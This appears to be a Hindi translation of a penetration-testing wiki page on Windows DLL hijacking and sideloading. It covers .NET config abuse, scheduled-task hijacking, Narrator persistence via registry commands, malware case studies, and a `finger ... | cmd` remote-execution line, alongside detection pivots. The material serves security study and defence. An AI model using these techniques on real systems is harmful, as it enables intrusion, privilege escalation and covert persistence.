...
1. **DLL Replacement**: वास्तविक DLL को malicious DLL से बदलना, और original DLL की functionality बनाए रखने के लिए वैकल्पिक रूप से DLL Proxying का उपयोग करना।
...
3. **Phantom DLL Hijacking**: application के लिए एक malicious DLL बनाना, ताकि वह उसे ऐसी आवश्यक DLL समझकर लोड करे जो वास्तव में मौजूद नहीं है।
...
Classic DLL sideloading ही trusted **.NET Framework** process से attacker code लोड करवाने का एकमात्र तरीका नहीं है। यदि target executable एक **managed** application है, तो CLR executable के नाम वाली **application configuration file** से भी जानकारी लेता है (उदाहरण के लिए `Setup.exe.config`)। यह file एक custom **AppDomainManager** को define कर सकती है। यदि config, EXE के पास रखी गई attacker-controlled assembly की ओर point करता है, तो CLR इसे **application के normal code path से पहले** लोड करता है और trusted process के भीतर चलाता है।<sup>[[24]](#references)</sup>
...
- Host वास्तव में एक **managed EXE** होना चाहिए। त्वरित triage: `sigcheck -m target.exe`, `corflags target.exe`, या PE metadata में **CLR Runtime Header** देखें।
- Config filename का executable name से बिल्कुल मेल खाना चाहिए (`<binary>.config`) और यह आमतौर पर **EXE** के साथ उसी directory में रहता है।
...
एक व्यावहारिक intrusion pattern trusted managed EXE को malicious `*.config` और एक malicious AppDomainManager DLL—जो केवल एक **small bootstrapper** के रूप में काम करती है—दोनों के साथ जोड़ता है:<sup>[[25]](#references)</sup>

1. User किसी विश्वसनीय location, जैसे `%USERPROFILE%\Downloads`, से signed .NET installer या updater launch करता है।
2. पास की config CLR को legitimate app logic शुरू होने से **पहले** attacker assembly load करने के लिए मजबूर करती है।
...
- Signed host EXE अपरिवर्तित रहता है, इसलिए केवल main binary को hash करने वाला triage compromise को miss कर सकता है।
- सरल **path-based anti-analysis** आम है: ZIP/EXE/DLL triad को Desktop, Temp या sandbox path पर ले जाने से chain जानबूझकर टूट सकती है।
...
```
Notes:
- ` /rl highest` का अर्थ उस user/session के लिए **उपलब्ध सर्वोच्च** है; यह अपने-आप में SYSTEM escalation की गारंटी नहीं है।
- इस technique को अक्सर classic missing-DLL search-order hijacking की बजाय **.NET config abuse के माध्यम से execution/persistence** के रूप में वर्गीकृत करना अधिक उचित होता है, हालांकि operators अक्सर दोनों को chain करते हैं।
...
- नए scheduled tasks, जिनका action `%LOCALAPPDATA%`, `%APPDATA%`, या `Downloads` के अंदर की location पर point करता हो और जिनके names browser/vendor updaters जैसे हों।
...
### मौजूदा scheduled task को hijack करके sideload chain को दोबारा launch करना

Persistence के लिए केवल **नया task बनाने** पर ध्यान न दें। कुछ intrusion sets तब तक प्रतीक्षा करते हैं जब तक कोई legitimate installer एक **normal updater task** न बना दे, और फिर **task action को rewrite** कर देते हैं ताकि मौजूदा name, author और trigger defenders को परिचित बने रहें।

Reusable workflow:
1. Legitimate software को install/run करें और identify करें कि वह सामान्यतः कौन-सा task बनाता है।
2. Task XML export करें और मौजूदा `<Exec><Command>` / `<Arguments>` values नोट करें।<sup>[[23]](#references)</sup>
3. केवल action को replace करें ताकि task किसी user-writable staging directory से आपके **trusted host EXE** को start करे, जो फिर real payload को side-load या AppDomain-load करता है।
...
- DFIR teams जो केवल **नए task names** की तलाश करती हैं, वे ऐसे task को miss कर सकती हैं जिसका registration पहले से मौजूद था, लेकिन जिसका action अब `%LOCALAPPDATA%`, `%APPDATA%`, या किसी अन्य attacker-controlled path की ओर point करता है।
...
- जब कोई **vendor-looking updater task** **user-writable directories** से execute हो या colocated `*.config` file वाली .NET EXE launch करे, तो alert करें।
...
किसी system के अंदर missing Dlls ढूँढने का सबसे common तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना और **निम्नलिखित 2 filters को set करना** है:

![Common Techniques - Missing Dlls ढूँढना: किसी system के अंदर missing Dlls ढूँढने का सबसे common तरीका sysinternals से procmon चलाना और निम्नलिखित 2 filters को set करना है](<../../../images/image (961).png>)

![Common Techniques - Missing Dlls ढूँढना: किसी system के अंदर missing Dlls ढूँढने का सबसे common तरीका sysinternals से procmon चलाना और निम्नलिखित 2 filters को set करना है](<../../../images/image (230).png>)
...
यदि आप **सामान्य रूप से missing dlls** ढूँढ रहे हैं, तो इसे कुछ **seconds** तक **running रहने दें**।\
...
Privileges escalate करने के लिए ऐसी **DLL** ढूँढें जिसे कोई privileged process उस location से load करने का प्रयास करता है जहाँ आप write कर सकते हैं। ऐसा तब हो सकता है जब आप उस directory को control करते हों जिसे legitimate DLL वाली directory से पहले search किया जाता है, या जब requested DLL मौजूद न हो और आप searched directories में से किसी एक में write कर सकते हों।
...
**Windows applications** pre-defined **search paths** के एक set का पालन करते हुए, एक particular sequence में DLLs को खोजती हैं। DLL hijacking की समस्या तब उत्पन्न होती है जब कोई harmful DLL इन directories में से किसी एक में strategically place कर दी जाती है, जिससे वह authentic DLL से पहले load हो जाए। इससे बचने का एक solution यह सुनिश्चित करना है कि application को आवश्यक DLLs refer करते समय absolute paths का उपयोग करे।
...
अंततः, किसी DLL को name के बजाय absolute path से load किया जा सकता है। ऐसी स्थिति में Windows स्वयं DLL के लिए केवल उस path को देखता है; name से requested dependencies फिर भी applicable search order का पालन करती हैं।

Search order को बदलने के अन्य तरीके भी हैं, लेकिन मैं उन्हें यहाँ explain नहीं करूँगा।
...
2. यदि binary किसी **schedule/service** पर run होती है, तो इनमें से किसी एक name वाली DLL को **application directory** (search-order entry #1) में drop करने पर वह अगले execution में load हो जाएगी। एक .NET scanner case में process ने `C:\samples\app\` में `hostfxr.dll` को `C:\Program Files\dotnet\fxr\...` से real copy load करने से पहले खोजा।
...
```
5. archive को watched inbox/share तक पहुंचाएं; जब scheduled task process को फिर से launch करेगा, तो यह malicious DLL लोड करेगा और service account के रूप में आपका code execute करेगा।

### RTL_USER_PROCESS_PARAMETERS.DllPath के माध्यम से sideloading को बाध्य करना

नए बनाए गए process के DLL search path को deterministically प्रभावित करने का एक advanced तरीका यह है कि process बनाते समय ntdll की native APIs का उपयोग करके RTL_USER_PROCESS_PARAMETERS में DllPath field सेट की जाए। यहां attacker-controlled directory प्रदान करके, किसी imported DLL को name से resolve करने वाले target process (absolute path के बिना और safe loading flags का उपयोग किए बिना) को उस directory से malicious DLL लोड करने के लिए बाध्य किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx के साथ process parameters बनाएं और एक custom DllPath प्रदान करें, जो आपके controlled folder (जैसे, वह directory जहां आपका dropper/unpacker मौजूद है) की ओर point करता हो।
- RtlCreateUserProcess के साथ process बनाएं। जब target binary किसी DLL को name से resolve करता है, तो loader resolution के दौरान दिए गए DllPath से consult करेगा, जिससे reliable sideloading संभव होगा, भले ही malicious DLL target EXE के साथ colocated न हो।
...
- Target को किसी DLL को name से import या LoadLibrary करना चाहिए (absolute path के बिना और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग किए बिना)।
...
- अपने DllPath directory में एक malicious xmllite.dll रखें (जो आवश्यक functions export करती हो या वास्तविक DLL को proxy करती हो)।
...
इस technique का उपयोग वास्तविक दुनिया में multi-stage sideloading chains को संचालित करने के लिए देखा गया है: एक initial launcher helper DLL को drop करता है, जो फिर custom DllPath के साथ Microsoft-signed, hijackable binary को spawn करता है, ताकि staging directory से attacker की DLL load हो सके।<sup>[[6]](#references)</sup>
...
4. यही config CLR को local assemblies को पहले resolve करने के लिए बाध्य कर सकती है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) और inline patching के बिना runtime validation/telemetry को कमजोर कर सकती है।
...
```
इसका उपयोगी होना:
- **`<probing privatePath="."/>`** assembly resolution को application directory में रखता है, जिससे folder एक अनुमानित sideloading surface बन जाता है।<sup>[[18]](#references)</sup>
...
- **`<etwEnable enabled="false"/>`** विशेष रूप से दिलचस्प है, क्योंकि **CLR configuration के माध्यम से अपनी ETW visibility disable करता है**, implant द्वारा memory में `EtwEventWrite` patch करने के बजाय।

हाल की campaigns में देखा गया operational pattern:
- Stage 1 `setup.exe`, `setup.exe.config`, और local assemblies drop करता है।
- Stage 2 इन्हें एक विश्वसनीय दिखने वाले **AppData update** folder में copy करता है, host का नाम `update.exe` जैसा रखता है, और उसे **scheduled task** के माध्यम से फिर से launch करता है।
- Stage 3 अंतिम RAT DLL/export load करने से पहले execution context verify करता है (उदाहरण के लिए Task Scheduler से अपेक्षित parent `svchost.exe`)।
...
- `.config` files जिनमें **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, या **`etwEnable enabled="false"`** शामिल हों।
...
- ऐसी parent/child chains जिनमें scheduled task किसी trusted .NET host को launch करता हो, जो तुरंत अपनी directory से non-vendor assemblies load करता हो।
...
- जब ऐसी **DLL जिसका नाम memory में पहले से loaded DLL के नाम से मेल खाता हो** मिले, तो system सामान्य search को bypass कर देता है। इसके बजाय, यह पहले redirection और manifest की जाँच करता है और फिर memory में पहले से मौजूद DLL पर default करता है। **इस स्थिति में system DLL के लिए search नहीं करता**।
...
- यह सुनिश्चित करें कि किसी भी ऐसी **directory** के लिए **write access** उपलब्ध हो जिसमें **DLL** के लिए **search** किया जाएगा। यह location executable की directory या system path के भीतर कोई directory हो सकती है।

ये prerequisites default रूप से uncommon हैं: privileged executables में आमतौर पर missing DLL dependencies नहीं होतीं, और standard users सामान्यतः system search-path directories में write नहीं कर सकते। Misconfigured environments फिर भी दोनों conditions को expose कर सकते हैं।\
यदि requirements पूरी होती हैं, तो [UACME](https://github.com/hfiref0x/UACME) project देखें। यद्यपि इसका मुख्य goal UAC bypass है, इसमें specific Windows versions के लिए DLL-hijacking PoCs शामिल हैं, जिन्हें अक्सर आपके द्वारा मिली writable directory के अनुसार adapt किया जा सकता है।
...
icacls "C:\Python27"
```
और **PATH के अंदर मौजूद सभी फ़ोल्डरों की permissions की जाँच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable के imports और किसी dll के exports को इस कमांड से भी जाँच सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**System Path folder** में write permissions के साथ **DLL Hijacking का दुरुपयोग करके privileges escalate करने** की पूरी guide के लिए देखें:
...
[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि क्या आपके पास system PATH के अंदर किसी folder पर write permissions हैं।\
...
यदि आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीजों में से एक **ऐसी dll बनाना होगा जो कम-से-कम उन सभी functions को export करे जिन्हें executable उससे import करेगा**। हालांकि, ध्यान दें कि DLL Hijacking, [Medium Integrity level से High **(UAC को bypass करके)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM तक**](../index.html#from-high-integrity-to-system) escalate करने के लिए उपयोगी है**।** आप **एक valid dll बनाने का तरीका** इस dll hijacking study में पा सकते हैं, जो execution के लिए DLL hijacking पर केंद्रित है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**।**\
इसके अलावा, **अगले अनुभा**ग में आपको कुछ **basic dll codes** मिलेंगे, जो **templates** के रूप में या **non-required functions exported वाली dll** बनाने के लिए उपयोगी हो सकते हैं।

## **DLLs बनाना और compile करना**

### **DLL Proxifying**

मूल रूप से, **DLL proxy** एक ऐसी DLL होती है जो **load होने पर आपके malicious code को execute करने** में सक्षम होती है, लेकिन साथ ही **real library को सभी calls relay करके expose** और **expected रूप से work** भी करती है।
...
कई मामलों में, आपके द्वारा compile की गई DLL को **victim process द्वारा import किए गए प्रत्येक function को export करना** आवश्यक होता है। यदि कोई आवश्यक export missing हो, तो binary उसे resolve नहीं कर सकती और exploit विफल हो जाता है।
...
```
<details>
<summary>C++ DLL का user creation उदाहरण</summary>
```c
...
Windows Narrator.exe अभी भी शुरू होने पर एक पूर्वानुमेय, language-specific localization DLL को probe करता है, जिसे arbitrary code execution और persistence के लिए hijack किया जा सकता है।<sup>[[7]](#references)</sup>
...
- Narrator शुरू करें और ऊपर दिए गए path को load करने के प्रयास को observe करें।
...
```
OPSEC में शांति
- एक naive hijack बोल या UI को highlight करेगा। शांत रहने के लिए, attach होने पर Narrator threads को enumerate करें, main thread को (`OpenThread(THREAD_SUSPEND_RESUME)`) खोलें और उसे `SuspendThread` करें; अपने thread में आगे बढ़ें। पूर्ण code के लिए PoC देखें।<sup>[[8]](#references)</sup>

Accessibility configuration के माध्यम से Trigger और persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए configuration के साथ, Narrator शुरू करने पर planted DLL load होती है। Secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होगी।
...
- Host पर RDP करें और logon screen पर Narrator launch करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होगी।
- RDP session बंद होने पर execution रुक जाती है—तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप किसी built-in Accessibility Tool (AT) की registry entry (जैसे CursorIndicator) को clone कर सकते हैं, उसे arbitrary binary/DLL की ओर point करने के लिए edit कर सकते हैं, फिर उसे import करके `configuration` को उस AT name पर set कर सकते हैं। इससे Accessibility framework के अंतर्गत arbitrary execution proxy होती है।

Notes
- `%windir%\System32` के अंतर्गत लिखने और HKLM values बदलने के लिए admin rights आवश्यक हैं।
- पूरा payload logic `DLL_PROCESS_ATTACH` में रखा जा सकता है; किसी export की आवश्यकता नहीं है।
...
- **DLL Search Behavior**: यह पहले अपने working directory से `hostfxr.dll` load करने का प्रयास करता है और missing होने पर "NAME NOT FOUND" log करता है, जो local directory search precedence दर्शाता है।
...
2. Scheduled task के वर्तमान user के context में सुबह 9:30 बजे चलने की प्रतीक्षा करें।
3. यदि task के execute होने के समय कोई administrator logged in है, तो malicious DLL administrator के session में medium integrity पर चलती है।
...
- जब signed EXE start किया जाता है, तो Windows DLL search order working directory से पहले wsc.dll load करता है और signed parent के अंतर्गत attacker code execute करता है (ATT&CK T1574.001)।

MSI analysis (क्या देखना है)
- CustomAction table:
- उन entries को देखें जो executables या VBScript चलाती हैं। Suspicious pattern का उदाहरण: LaunchApplication, जो background में embedded file execute करता है।
...
```
- Export requirements के लिए, एक proxying framework (जैसे DLLirant/Spartacus) का उपयोग करके forwarding DLL बनाएं, जो आपके payload को भी execute करे।
...
- KnownDLLs, SxS और forwarded exports precedence को प्रभावित कर सकते हैं; host binary और export set चुनते समय इन्हें ध्यान में रखना आवश्यक है।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon ShadowPad को कैसे deploy करता है: legitimate software में घुलने-मिलने और core payload को disk पर encrypted रखने के लिए **three-file triad** का उपयोग किया जाता है:<sup>[[12]](#references)</sup>
...
* Signed EXE का नाम बदलना (PE header में original `OriginalFileName` रखते हुए) उसे Windows binary का रूप देता है और vendor signature भी बनाए रखता है। इसलिए Ink Dragon की तरह `conhost.exe` जैसे दिखने वाले binaries drop करने की आदत दोहराएं, जबकि वे वास्तव में AMD/NVIDIA utilities हों।
* चूंकि executable trusted रहता है, अधिकांश allowlisting controls में केवल आपकी malicious DLL का उसके साथ मौजूद होना आवश्यक होता है। Loader DLL को customize करने पर ध्यान दें; signed parent आमतौर पर बिना बदलाव के चल सकता है।
...
Operators DLL sideloading को LOLBAS के साथ जोड़ते हैं, ताकि disk पर एकमात्र custom artifact trusted EXE के पास मौजूद malicious DLL हो:<sup>[[1]](#references)</sup>
...
```
- `finger user@host` TCP/79 text प्राप्त करता है; `| cmd` server response को execute करता है, जिससे operators second stage को server-side rotate कर सकते हैं।
...
```
- यह उन binaries के साथ काम करता है जो local DLLs को प्राथमिकता देते हैं (जैसे `intelbq.exe`, `nearby_share.exe`); payload (जैसे Remcos) trusted name के अंतर्गत चलता है।
...
एक recent Lotus Blossom intrusion ने trusted update chain का दुरुपयोग करके NSIS-packed dropper deliver किया, जिसने DLL sideload और पूरी तरह in-memory payloads को stage किया।<sup>[[13]](#references)</sup>
...
- IAT से बचने के लिए loader export names को hashing करके APIs resolve करता है: FNV-1a basis 0x811C9DC5 + prime 0x100019, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करता है और salted target hashes से तुलना करता है।

Main shellcode (Chrysalis)
- यह PE-जैसे main module को `gQ2JR&9;` key के साथ पांच passes में add/XOR/sub दोहराकर decrypt करता है, फिर import resolution पूरा करने के लिए `Kernel32.dll` → `GetProcAddress` को dynamically load करता है।
- Runtime पर per-character bit-rotate/XOR transforms के माध्यम से DLL name strings reconstruct करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- दूसरा resolver **PEB → InMemoryOrderModuleList** को walk करता है, प्रत्येक export table को 4-byte blocks में Murmur-style mixing के साथ parse करता है और hash न मिलने पर ही `GetProcAddress` पर fallback करता है।

Embedded configuration & C2
- Config dropped `BluetoothService` file के **offset 0x30808** (size **0x980**) पर मौजूद होती है और `qwhvb^435h&*7` key से RC4-decrypt की जाती है, जिससे C2 URL और User-Agent प्राप्त होते हैं।
- Beacons dot-delimited host profile बनाते हैं, उसके आगे `4Q` tag जोड़ते हैं, फिर `HttpSendRequestA` के माध्यम से HTTPS पर भेजने से पहले `vAuig34%^325hGV` key से RC4-encrypt करते हैं। Responses RC4-decrypt की जाती हैं और tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases) द्वारा dispatch की जाती हैं।
- Execution mode CLI args से gated है: बिना args के `-i` की ओर संकेत करने वाली persistence (service/Run key) install होती है; `-i` स्वयं को `-k` के साथ relaunch करता है; `-k` install को skip करके payload run करता है।

Alternate loader observed
- उसी intrusion ने Tiny C Compiler भी drop किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` execute किया, जिसके पास `libtcc.dll` मौजूद थी। Attacker-supplied C source में embedded shellcode था, जिसे compile करके in-memory run किया गया और PE को disk पर लिखने की आवश्यकता नहीं पड़ी। इससे replicate करें:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- यह TCC-based compile-and-run stage runtime पर `Wininet.dll` import करता था और hardcoded URL से second-stage shellcode प्राप्त करता था, जिससे ऐसा flexible loader मिलता था जो compiler run का रूप धारण करता था।

## Signed-host sideloading with export proxying + host thread parking

कुछ DLL sideloading chains में **stability engineering** जोड़ी जाती है, ताकि legitimate host बाद के stages को crash हुए बिना ठीक से load करने के लिए पर्याप्त समय तक alive रहे।<sup>[[11]](#references)</sup>

Observed pattern
- expected dependency name, जैसे `version.dll`, का उपयोग करके किसी trusted EXE को malicious DLL के साथ रखें।
...
Why this matters
- सामान्य DLL proxying API compatibility बनाए रखता है, लेकिन यह सुनिश्चित नहीं करता कि host बाद के stages के लिए पर्याप्त समय तक alive रहेगा।
- `Sleep(INFINITE)` में main thread को park करना signed process को resident बनाए रखने का एक सरल तरीका है, जबकि loader worker thread में decryption, staging या network bootstrap करता है।
- केवल suspicious `DllMain` को hunt करने पर यह pattern छूट सकता है, यदि महत्वपूर्ण behavior host entry point patch किए जाने और secondary thread शुरू होने के बाद होता है।

Minimal workflow
1. Signed host EXE को copy करें और निर्धारित करें कि वह local directory से कौन-सी DLL resolve करता है।
2. उसी functions को export करने वाली और उन्हें legitimate DLL पर forward करने वाली proxy DLL बनाएं।
...
Defensive pivots
- ऐसे signed processes जो `version.dll` या इसी तरह की common libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- Image load के तुरंत बाद process entry point पर memory patches, विशेष रूप से वे jumps/calls जिन्हें `Sleep`/`SleepEx` पर redirect किया गया हो।
